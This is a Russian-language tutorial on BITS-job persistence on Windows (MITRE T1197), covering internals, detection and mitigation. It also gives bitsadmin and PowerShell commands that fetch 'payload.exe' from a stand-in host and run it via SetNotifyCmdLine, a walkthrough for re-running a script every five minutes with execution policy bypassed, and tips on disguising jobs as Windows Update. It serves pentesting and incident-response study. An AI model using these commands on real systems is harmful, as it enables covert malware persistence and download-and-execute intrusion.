# BITS Jobs как вектор закрепления (Persistence) в Windows

## Контекст и базовые понятия

Background Intelligent Transfer Service (BITS) — это системный сервис Windows, предназначенный для асинхронной передачи файлов с низким приоритетом и ограничением пропускной способности. Изначально BITS был разработан для обеспечения стабильной работы пользовательских приложений во время загрузки обновлений Windows или синхронизации данных, позволяя переносить нагрузку на периоды низкой загрузки сети. В контексте информационной безопасности и тестирования на проникновение BITS классифицируется как техника закрепления (Persistence) с идентификатором **MITRE ATT&CK T1197**.

Ключевая особенность BITS, делающая его привлекательным для злоумышленников, заключается в том, что задачи (jobs) хранятся в собственной базе данных сервиса, а не в стандартных местах хранения конфигураций (таких как реестр `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` или папка автозагрузки). Это позволяет обходить базовые механизмы обнаружения, ориентированные на мониторинг изменений реестра. Кроме того, BITS использует легитимные сетевые протоколы (HTTP/HTTPS) и часто разрешен корпоративными межсетевыми экранами, что обеспечивает скрытность передачи данных (Ingress Tool Transfer) и выполнения команд (Command and Control).

Для понимания механизмов эксплуатации необходимо разграничить легитимное использование BITS и его аномалии. Легитимные процессы BITS обычно инициируются системными компонентами (Windows Update, SCCM, Microsoft Office) и работают под учетной записью `SYSTEM` или локальными службами. Злоумышленники же создают задачи от имени текущего пользователя, используют нестандартные имена задач, указывают внешние URL-адреса и, что наиболее критично, применяют метод `SetNotifyCmdLine` для выполнения произвольного кода после завершения или при ошибке передачи.

Различие между легитимными и вредоносными задачами часто сводится к контексту создания и параметрам жизненного цикла. Легитимные задачи имеют короткий срок жизни, четкие цели и не требуют ручного вмешательства. Вредоносные задачи могут быть настроены на бесконечное повторение, использовать задержки для обхода детектирования и запускать исполняемые файлы, не связанные с обновлением системы.

| Характеристика | Легитимные BITS-задачи | Вредоносные BITS-задачи (T1197) |
| :--- | :--- | :--- |
| **Инициатор** | Системные службы, обновления ОС, SCCM | Пользовательские скрипты, `bitsadmin`, COM-интерфейсы |
| **Хранение данных** | Внутренняя БД QMGR (зашифрована/защищена) | Внутренняя БД QMGR (доступна для парсинга) |
| **Сетевой трафик** | Официальные домены Microsoft (`*.windowsupdate.com`) | Внешние IP/домены, C2-серверы, облачные хранилища |
| **Срок жизни** | Короткий (минуты/часы), удаляется после выполнения | Длительный (до 90 дней и более), бесконечные повторы |
| **NotifyCmdLine** | Не используется или указывает на легитимные скрипты | Указывает на вредоносный бинарник или скрипт |
| **Пользователь** | `SYSTEM`, `LocalService` | Текущий пользователь, часто с правами администратора |
| **Цель** | Загрузка обновлений, синхронизация файлов | Закрепление, загрузка payload, эксфильтрация данных |

Артефакты BITS-задач находятся в файловой системе в директории `%ALLUSERSPROFILE%\Microsoft\Network\Downloader\` (обычно `C:\ProgramData\Microsoft\Network\Downloader\`). Файлы имеют расширение `.dat` и содержат сериализованные объекты задач. В современных версиях Windows (10/11) эти файлы открываются сервисом без права общего доступа (no sharing), что затрудняет их прямое чтение сторонними инструментами, однако существуют методы обхода этого ограничения для форензики.

## Внутреннее устройство предмета

BITS работает на основе архитектуры клиент-сервер, где клиентская часть реализована в виде службы `BITS` (процесс `svchost.exe -k netsvcs -s BITS`). Взаимодействие с сервисом осуществляется через Component Object Model (COM) интерфейс `IBackgroundCopyManager`. Этот интерфейс предоставляет методы для создания, управления и завершения задач. Каждая задача (BITS Job) представляет собой очередь из одного или нескольких файлов, которые должны быть переданы между клиентом и сервером.

Структура BITS-задачи включает в себя несколько ключевых компонентов, определяющих ее поведение и состояние. Понимание этих компонентов необходимо для анализа механизмов закрепления.

1.  **Job ID**: Уникальный идентификатор задачи (GUID), используемый для управления ею.
2.  **Files Queue**: Список файлов для передачи. Каждый файл имеет источник (Source URL) и назначение (Destination Path).
3.  **State**: Текущее состояние задачи (`Queued`, `Transferring`, `Suspended`, `Error`, `TransientError`, `Completed`). Переходы между состояниями могут триггерить события.
4.  **NotifyFlags**: Флаги, определяющие, когда служба должна уведомить приложение о завершении задачи (например, `BG_NOTIFY_JOB_TRANSFERRED`, `BG_NOTIFY_JOB_ERROR`).
5.  **NotifyCmdLine**: Строка командной строки, которая будет выполнена системой при наступлении события, указанного в `NotifyFlags`. Это ключевой элемент для техники T1197.
6.  **MinRetryDelay**: Минимальная задержка перед повторной попыткой передачи при ошибке.
7.  **NoProgressTimeout**: Время ожидания без прогресса перед возобновлением или ошибкой.

Механизм закрепления через `SetNotifyCmdLine` опирается на асинхронную природу BITS. Поскольку передача файлов может занимать время или прерываться, BITS позволяет задать команду, которая выполнится в контексте службы BITS (или пользователя, создавшего задачу, в зависимости от конфигурации и версии ОС) после завершения передачи или возникновения ошибки. Злоумышленники используют это, устанавливая `NotifyCmdLine` на путь к своему вредоносному исполняемому файлу. Если задача настроена на бесконечное повторение (через установку `MinRetryDelay` и возврат ненулевого кода выхода из уведомляемого скрипта), она обеспечивает периодическое выполнение кода, переживая перезагрузки системы.

База данных BITS (QMGR - Queue Manager) хранит метаданные задач. В Windows XP/7 эти данные были доступны напрямую. В Windows 8+ база данных защищена, но структура остается схожей. Для анализа артефактов используются специализированные инструменты, такие как `BitsParser` (часть набора Velociraptor или FireEye), которые умеют парсить эти файлы даже при блокировке.

Сетевое взаимодействие BITS также является важным аспектом. BITS использует HTTP/HTTPS для передачи данных. Заголовки HTTP-запросов BITS часто маскируются под легитимные запросы браузера или системных служб (например, `User-Agent: Microsoft BITS/7.5`). Это позволяет трафику BITS проходить через прокси-серверы и межсетевые экраны без блокировки, если политика разрешает исходящий HTTP/HTTPS-трафик.

| Компонент BITS | Описание | Роль в технике T1197 |
| :--- | :--- | :--- |
| `IBackgroundCopyManager` | COM-интерфейс для управления задачами | Точка входа для создания вредоносной задачи |
| `IBackgroundCopyJob` | Интерфейс самой задачи | Хранит параметры передачи и уведомления |
| `AddFile` | Метод добавления файла в очередь | Загрузка payload на диск или в память |
| `SetNotifyCmdLine` | Метод установки команды уведомления | **Ключевой метод**: задает путь к исполняемому файлу для выполнения |
| `SetNotifyFlags` | Метод установки флагов событий | Определяет триггер для выполнения команды (например, `BG_NOTIFY_JOB_ERROR`) |
| `SetMinRetryDelay` | Метод установки задержки повтора | Обеспечивает периодичность выполнения (циклическое закрепление) |
| `QMGR Database` | Файлы `%ALLUSERSPROFILE%\...\*.dat` | Хранит артефакты задачи, доступные для форензики |

Важно отметить, что BITS может работать как для загрузки (download), так и для выгрузки (upload) данных. Это позволяет использовать его не только для закрепления, но и для эксфильтрации данных (Exfiltration Over Alternative Protocol), маскируя утечку под легитимный трафик обновлений.

## Применение и работа с предметом

На практике работа с BITS для закрепления осуществляется через два основных интерфейса: утилиту командной строки `bitsadmin` и PowerShell-командлеты `Start-BitsTransfer` / `Get-BitsTransfer`. Оба метода предоставляют доступ к COM-интерфейсам BITS и позволяют создавать задачи с произвольными параметрами.

Рассмотрим типичный пайплайн эксплуатации техники T1197. Злоумышленник, получив доступ к системе (например, через RDP или shell), создает BITS-задачу, которая будет загружать вредоносный файл с удаленного сервера и выполнять его после завершения. Для обеспечения устойчивости задача настраивается на бесконечное повторение.

Ключевым шагом является установка `SetNotifyCmdLine`. Если задача завершается успешно, BITS выполнит указанную команду. Если задача завершается с ошибкой (например, из-за отсутствия сети), и установлен флаг `BG_NOTIFY_JOB_ERROR`, BITS также выполнит команду после истечения `MinRetryDelay`. Злоумышленники часто используют второй вариант, так как он более надежен в условиях нестабильного соединения.

Для обхода детектирования важно использовать легитимные имена задач (например, "Windows Update", "Microsoft Edge Update") и доверенные домены для загрузки. Также стоит избегать использования `bitsadmin` в явном виде, если это возможно, предпочитая PowerShell, так как `bitsadmin` реже используется в легитимных сценариях на современных системах.

Ниже приведен пример создания BITS-задачи с использованием `bitsadmin`, который демонстрирует базовую структуру команды.

```bash
# Создание задачи с именем, маскирующимся под системное обновление
bitsadmin /create MicrosoftUpdateJob

# Добавление файла для загрузки (источник -> назначение)
# В реальном сценарии источник будет URL вредоносного payload
bitsadmin /addfile MicrosoftUpdateJob https://example.com/payload.exe C:\Temp\payload.exe

# Установка команды, которая будет выполнена после завершения задачи
# NULL означает, что аргументы не передаются, но путь к бинарнику указывается
bitsadmin /SetNotifyCmdLine MicrosoftUpdateJob C:\Temp\payload.exe NULL

# Установка задержки повтора в 60 секунд (для циклического выполнения)
bitsadmin /SetMinRetryDelay MicrosoftUpdateJob 60

# Запуск задачи
bitsadmin /resume MicrosoftUpdateJob
```

В PowerShell аналогичный процесс выглядит более объектно-ориентированным и гибким. PowerShell позволяет напрямую работать с COM-объектами, что дает больше контроля над параметрами.

```powershell
# Создание COM-объекта BITS
$bits = New-Object -ComObject Bits.Admin

# Создание задачи
$job = $bits.CreateJob("MicrosoftUpdateJob", 1) # 1 = BG_JOB_TYPE_DOWNLOAD

# Добавление файла
$job.AddFile("https://example.com/payload.exe", "C:\Temp\payload.exe")

# Установка флагов уведомления (BG_NOTIFY_JOB_ERROR = 4)
$job.SetNotifyFlags(4)

# Установка команды уведомления
$job.SetNotifyCmdLine("C:\Temp\payload.exe", "")

# Установка задержки повтора
$job.SetMinRetryDelay(60)

# Запуск задачи
$job.Submit()
```

При анализе BITS-задач на скомпрометированной системе необходимо проверять не только активные задачи, но и завершенные или ошибочные, так как они могут содержать артефакты предыдущих атак. Инструменты вроде `Get-BitsTransfer` в PowerShell позволяют перечислить все задачи, принадлежащие текущему пользователю.

```powershell
# Получение списка всех BITS-задач
Get-BitsTransfer | Select-Object DisplayName, JobState, OwnerSid, Source, Destination
```

Для форензики критически важно извлекать данные из базы QMGR. Поскольку файлы заблокированы, прямое копирование невозможно. Используются методы, такие как VSS (Volume Shadow Copy) или специализированные парсеры, которые читают данные на уровне драйвера.

## Сквозной практический пример: Закрепление через BITS NotifyCmdLine

**Исходные условия:**
*   **Среда:** Windows 10 Pro, пользователь с правами локального администратора.
*   **Инструменты:** PowerShell, утилита `bitsadmin`, локальный HTTP-сервер (для имитации C2).
*   **Сценарий:** Злоумышленник хочет закрепить вредоносный скрипт `malicious.ps1` на системе так, чтобы он выполнялся каждые 5 минут, если предыдущая попытка завершилась ошибкой (имитация нестабильного соединения или обхода антивируса).

**Шаг 1: Подготовка вредоносного payload**
Создадим простой скрипт, который будет имитировать вредоносную активность (например, запись в лог или запуск калькулятора) и возврат ненулевого кода выхода, чтобы BITS считал задачу ошибочной и повторил выполнение.

```powershell
# Создание файла C:\Temp\malicious.ps1
$content = @"
Write-Host "Malicious activity executed"
# Возвращаем код ошибки 1, чтобы BITS повторил задачу
exit 1
"@
Set-Content -Path "C:\Temp\malicious.ps1" -Value $content
```

**Шаг 2: Создание BITS-задачи через PowerShell**
Используем PowerShell для создания задачи, которая будет пытаться загрузить файл (для легитимности) и выполнять скрипт при ошибке.

```powershell
# Инициализация BITS
$bits = New-Object -ComObject Bits.Admin
$job = $bits.CreateJob("WindowsUpdateCheck", 1)

# Добавляем несуществующий файл, чтобы вызвать ошибку (или используем реальный URL, который недоступен)
# В данном примере мы симулируем ошибку, указав несуществующий URL
$job.AddFile("https://192.168.1.100/nonexistent.exe", "C:\Temp\dummy.exe")

# Устанавливаем флаг уведомления на ошибку
$job.SetNotifyFlags(4) # BG_NOTIFY_JOB_ERROR

# Устанавливаем команду уведомления на наш PowerShell-скрипт
# Важно: BITS может требовать полный путь к интерпретатору, если файл .ps1
$job.SetNotifyCmdLine("powershell.exe", "-ExecutionPolicy Bypass -File C:\Temp\malicious.ps1")

# Устанавливаем задержку повтора в 5 минут (300 секунд)
$job.SetMinRetryDelay(300)

# Запускаем задачу
$job.Submit()
```

**Шаг 3: Мониторинг активности**
Проверяем статус задачи и ожидаем возникновения ошибки.

```powershell
# Проверка статуса задачи
$job | Select-Object DisplayName, JobState, ErrorDescription
```
*Ожидаемый результат:* Задача перейдет в состояние `Error` или `TransientError`, так как сервер `192.168.1.100` недоступен.

**Шаг 4: Имитация истечения времени повтора**
Так как мы не можем ждать 5 минут в учебном примере, мы можем изменить системное время или использовать другой метод принудительного запуска. Однако, для демонстрации механизма достаточно показать, что задача настроена на повтор.

**Шаг 5: Анализ артефактов**
Проверяем, какие процессы были запущены в результате уведомления.

```powershell
# Поиск в Event Log событий создания процессов, связанных с BITS
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Bits-Client/Operational'; ID=17041} | Select-Object TimeCreated, Message
```
*Ожидаемый вывод:* Событие, указывающее на запуск `powershell.exe` с аргументами, указанными в `NotifyCmdLine`.

**Ожидаемый вывод:**
Пример демонстрирует, как BITS может быть использован для периодического выполнения кода без создания новых файлов в стандартных местах автозагрузки. Задача хранится в БД BITS, а выполнение триггерится событием ошибки, что позволяет обходить детектирование, ориентированное на успешное выполнение задач.

## Аналитический вывод

Техника T1197 (BITS Jobs) представляет собой серьезную угрозу для стабильности и безопасности Windows-инфраструктур благодаря своей способности маскироваться под легитимную активность. Ключевая уязвимость заключается в асинхронной природе BITS и возможности установки произвольных команд через `SetNotifyCmdLine`, что позволяет злоумышленникам выполнять код в контексте службы или пользователя, переживая перезагрузки системы. Отсутствие изменений в реестре и использование легитимных сетевых протоколов делают обнаружение этой техники сложной задачей для базовых средств защиты.

Эффективное обнаружение требует комплексного подхода, включающего мониторинг создания BITS-задач через EDR-агенты, анализ сетевого трафика на наличие аномальных HTTP/HTTPS-запросов от процесса `svchost.exe`, а также регулярный парсинг базы данных QMGR на предмет подозрительных задач. Митигация должна включать ограничение прав доступа к BITS-интерфейсу, настройку политик групп для сокращения срока жизни задач и фильтрацию исходящего трафика BITS на уровне межсетевого экрана. Понимание внутренних механизмов BITS и его интеграции с COM-интерфейсами является критически важным для специалистов по реагированию на инциденты и тестированию на проникновение.
